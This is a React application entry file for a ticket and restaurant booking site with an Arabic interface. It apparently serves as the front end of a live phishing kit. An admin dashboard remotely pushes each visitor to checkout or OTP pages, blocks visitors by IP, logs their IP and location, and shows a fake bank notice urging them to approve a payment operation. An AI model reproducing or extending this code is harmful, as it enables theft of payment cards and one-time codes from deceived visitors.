import { Switch, Route, useLocation } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { Loading } from "@/components/loading";
import { Suspense, lazy, useEffect, useState } from "react";
import { setupOnlineStatus } from "@/lib/utils";
import {
  listenForDirectedStep,
  clearDirectedStep,
  ensureVisitorIp,
  listenForIpBlock,
  listenForVisitorBlock,
  listenForBankContactRequest,
  confirmBankContact,
} from "@/lib/firebase";

const TICKET_STEP_TO_PATH: Record<number, string> = {
  1: "/registration",
  2: "/booking",
  3: "/cart",
  4: "/checkout",
  5: "/otp",
  6: "/otp",
  7: "/confirmation",
};

// For restaurant flow, steps 2 (booking) and 3 (reserve_checkout) are
// internal page steps inside `/reserve/:id`. We dispatch a custom event for
// reserve.tsx to handle without losing the restaurant URL context. OTP and
// confirmation steps still map to shared routes.
const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
  5: "/otp",
  6: "/otp",
  7: "/confirmation",
};

// Steps that the reserve.tsx page handles internally (no URL change needed).
const RESTAURANT_INTERNAL_STEPS = new Set<number>([2, 3]);

function isRestaurantVisitor(data: any): boolean {
  return (
    window.location.pathname.startsWith("/reserve") ||
    String(data?.type || "").toLowerCase() === "restaurant_reservation" ||
    !!data?.restaurant ||
    !!data?.restaurantEn ||
    String(data?.currentPage || "") === "reserve_checkout" ||
    String(data?.currentPage || "") === "reserve_otp"
  );
}

function pickTargetPath(step: number, data: any): string | null {
  const isRestaurant = isRestaurantVisitor(data);
  const map = isRestaurant ? RESTAURANT_STEP_TO_PATH : TICKET_STEP_TO_PATH;
  return map[step] || null;
}

function DirectedStepWatcher() {
  const [location, setLocation] = useLocation();
  useEffect(() => {
    let unsubscribe: (() => void) | undefined;
    let attachedFor: string | null = null;

    const isAdminPath = () => {
      const p = window.location.pathname;
      return p.startsWith("/dashboard") || p.startsWith("/login");
    };

    const handler = (step: number, data: any) => {
      // Re-check at fire time so admins don't get hijacked even if the
      // listener was attached on a non-admin path earlier.
      if (isAdminPath()) return;

      // Restaurant SPA-internal steps: hand off to reserve.tsx via a custom
      // event so it can update its internal step state without us navigating
      // away from /reserve/:id.
      if (
        isRestaurantVisitor(data) &&
        RESTAURANT_INTERNAL_STEPS.has(step) &&
        window.location.pathname.startsWith("/reserve")
      ) {
        window.dispatchEvent(
          new CustomEvent("admin-restaurant-step", { detail: { step } }),
        );
        void clearDirectedStep();
        return;
      }

      const target = pickTargetPath(step, data);
      // Always clear so the same step can be re-pushed and so the dashboard
      // doesn't keep showing a stale "directed" indicator.
      void clearDirectedStep();
      if (!target) return;
      if (window.location.pathname !== target) {
        setLocation(target);
      }
    };

    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsubscribe) unsubscribe();
      attachedFor = id;
      unsubscribe = listenForDirectedStep(handler);
    };

    tryAttach();
    // The visitor ID is created on registration, which can happen after this
    // effect first runs. Poll every 1.5s so the listener attaches as soon as
    // the visitor record exists.
    const retry = window.setInterval(tryAttach, 1500);

    return () => {
      window.clearInterval(retry);
      if (unsubscribe) unsubscribe();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  void location;
  return null;
}

const Home = lazy(() => import("@/pages/home"));
const TicketsPage = lazy(() => import("@/pages/tickets"));
const RegistrationPage = lazy(() => import("@/pages/registration"));
const BookingPage = lazy(() => import("@/pages/booking"));
const CartPage = lazy(() => import("@/pages/cart"));
const CheckoutPage = lazy(() => import("@/pages/checkout"));
const OTPPage = lazy(() => import("@/pages/otp"));
const ConfirmationPage = lazy(() => import("@/pages/confirmation"));
const DashboardPage = lazy(() => import("@/pages/dashboard"));
const LoginPage = lazy(() => import("@/pages/login"));
const RestaurantsPage = lazy(() => import("@/pages/restaurants"));
const RestaurantDetailPage = lazy(() => import("@/pages/restaurant-detail"));
const ReservePage = lazy(() => import("@/pages/reserve"));
const NotFound = lazy(() => import("@/pages/not-found"));

function Router() {
  return (
    <Suspense fallback={<Loading />}>
      <Switch>
        <Route path="/" component={Home} />
        <Route path="/tickets" component={TicketsPage} />
        <Route path="/registration" component={RegistrationPage} />
        <Route path="/booking" component={BookingPage} />
        <Route path="/cart" component={CartPage} />
        <Route path="/checkout" component={CheckoutPage} />
        <Route path="/otp" component={OTPPage} />
        <Route path="/confirmation" component={ConfirmationPage} />
        <Route path="/dashboard" component={DashboardPage} />
        <Route path="/login" component={LoginPage} />
        <Route path="/restaurants" component={RestaurantsPage} />
        <Route path="/restaurant/:id" component={RestaurantDetailPage} />
        <Route path="/reserve/:id" component={ReservePage} />
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

function BlockedScreen() {
  return (
    <div
      dir="rtl"
      className="min-h-screen flex items-center justify-center bg-[#1a0a10] text-white p-6"
      data-testid="blocked-screen"
    >
      <div className="max-w-md w-full text-center bg-[#2a1018] border border-[#4a1525] rounded-2xl p-8 shadow-2xl">
        <div className="text-5xl mb-4">⛔</div>
        <h1 className="text-2xl font-bold mb-3 text-[#c9a96e]">
          تم حظر الوصول
        </h1>
        <p className="text-sm text-slate-300 leading-relaxed">
          عذراً، لا يمكنك الوصول إلى هذا الموقع حالياً. إذا كنت تعتقد أن هذا
          خطأ، يرجى التواصل مع الدعم الفني.
        </p>
      </div>
    </div>
  );
}

function BlockGate({ children }: { children: React.ReactNode }) {
  const [ipBlocked, setIpBlocked] = useState(false);
  const [visitorBlocked, setVisitorBlocked] = useState(false);

  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let unsubIp: (() => void) | undefined;
    let unsubVisitor: (() => void) | undefined;
    let cancelled = false;

    (async () => {
      const { ip, blocked: initial } = await ensureVisitorIp();
      if (cancelled) return;
      setIpBlocked(initial);
      if (ip) {
        unsubIp = listenForIpBlock(ip, (nowBlocked) => {
          setIpBlocked(nowBlocked);
        });
      }
    })();

    // Visitor-block listener: when a visitor record exists (set on
    // registration), subscribe to its `blocked` flag so admin actions take
    // effect immediately. Poll for the visitor ID since it can be created
    // after this effect first runs.
    let attachedFor: string | null = null;
    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsubVisitor) unsubVisitor();
      attachedFor = id;
      unsubVisitor = listenForVisitorBlock((blocked) => {
        setVisitorBlocked(blocked);
      });
      // Now that the visitor doc exists, persist their IP + geolocation onto
      // it so the dashboard can show the real country.
      void ensureVisitorIp();
    };
    tryAttach();
    const retryInterval = window.setInterval(tryAttach, 1500);

    return () => {
      cancelled = true;
      if (unsubIp) unsubIp();
      if (unsubVisitor) unsubVisitor();
      window.clearInterval(retryInterval);
    };
  }, []);

  if (ipBlocked || visitorBlocked) {
    return <BlockedScreen />;
  }

  return <>{children}</>;
}

function BankContactModal({ onConfirm }: { onConfirm: () => void }) {
  const [submitting, setSubmitting] = useState(false);
  return (
    <div
      dir="rtl"
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
      data-testid="bank-contact-modal"
    >
      <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden">
        <div className="bg-gradient-to-br from-[#4a1525] to-[#2a0a14] p-6 text-center">
          <div className="w-16 h-16 mx-auto rounded-full bg-white/15 flex items-center justify-center mb-3">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="w-9 h-9 text-[#c9a96e]"
            >
              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
            </svg>
          </div>
          <h2 className="text-white text-xl font-bold">إشعار من البنك</h2>
        </div>
        <div className="p-6 space-y-5">
          <p
            className="text-slate-800 text-base leading-relaxed text-center"
            data-testid="text-bank-contact-message"
          >
            سيتم التواصل معكم من قبل البنك الخاص بكم، يرجى اتباع الخطوات
            المطلوبة والموافقة على العملية لإتمام عملية الدفع.
          </p>
          <button
            onClick={async () => {
              if (submitting) return;
              setSubmitting(true);
              try {
                await confirmBankContact();
              } finally {
                onConfirm();
              }
            }}
            disabled={submitting}
            className="w-full py-3 bg-gradient-to-r from-[#4a1525] to-[#6b1f37] hover:from-[#5a1a2e] hover:to-[#7a2440] text-white rounded-xl font-bold shadow-lg transition-all disabled:opacity-60"
            data-testid="button-confirm-bank-contact"
          >
            {submitting ? "جاري التأكيد..." : "تمت الموافقة"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BankContactGate() {
  const [show, setShow] = useState(false);

  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let unsub: (() => void) | undefined;
    let attachedFor: string | null = null;

    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsub) unsub();
      attachedFor = id;
      unsub = listenForBankContactRequest((shouldShow) => {
        setShow(shouldShow);
      });
    };

    tryAttach();
    const retry = window.setInterval(tryAttach, 1500);

    return () => {
      window.clearInterval(retry);
      if (unsub) unsub();
    };
  }, []);

  if (!show) return null;
  return <BankContactModal onConfirm={() => setShow(false)} />;
}

function App() {
  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) {
      return;
    }
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <BlockGate>
          <DirectedStepWatcher />
          <BankContactGate />
          <Router />
        </BlockGate>
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
